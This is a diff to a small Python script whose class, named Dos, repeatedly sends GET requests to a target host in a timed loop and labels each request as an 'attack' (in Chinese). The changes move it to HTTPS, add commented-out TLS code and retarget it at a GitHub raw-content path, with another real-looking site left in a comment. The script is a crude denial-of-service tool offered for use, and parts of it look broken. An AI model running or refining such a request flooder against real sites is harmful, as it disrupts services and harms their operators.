@@ -1,4 +1,5 @@
 import http.client
+import urllib
 import time
 
 class Dos(object):
@@ -10,11 +11,24 @@ class Dos(object):
             print('第',i+1,'次攻击')
             time.sleep(sleepTime)
             try:
-                conn = http.client.HTTPConnection(servAddr)
-                conn.request('GET',url)
-                r1 = conn.getresponse()
-                print(r1.status,r1.reason)
-                conn.close()
+                #conn = http.client.HTTPConnection(servAddr)
+                #conn.request('GET',url)
+                #r1 = conn.getresponse()
+                #print(r1.status,r1.reason)
+                #conn.close()
+
+		#conns = httplib.HTTPSConnection(servAddr)
+		#sock = socket.create_connection((conns.host, conns.port))
+		#conns.sock = ssl.wrap_socket(sock, ca_certs=CERT_FILE, cert_reqs=ssl.CERT_REQUIRED, ssl_version=ssl.PROTOCOL_TLSv1)
+		#conns.request('GET',url)
+                #r1 = conns.getresponse()
+                #print(r1.status,r1.reason)
+                #conns.close()
+
+                conns=http.client.HTTPSConnection(servAddr)
+                conns.request("GET", url)
+                r1 = conns.getresponse()
+                print(r1.status, r1.reason, r1.read())
             except IOError as e:
                 print("except:",e)
             finally:
@@ -24,7 +38,7 @@ class Dos(object):
 
 
 if __name__ == '__main__':
-    servAddr = "https://raw.githubusercontent.com/bl201809/bllist/master"
+    servAddr = "raw.githubusercontent.com/bl201809/bllist/master"
     #servAddr = "www.dthas.info"
     #url = "/"
     url = "/index.html"
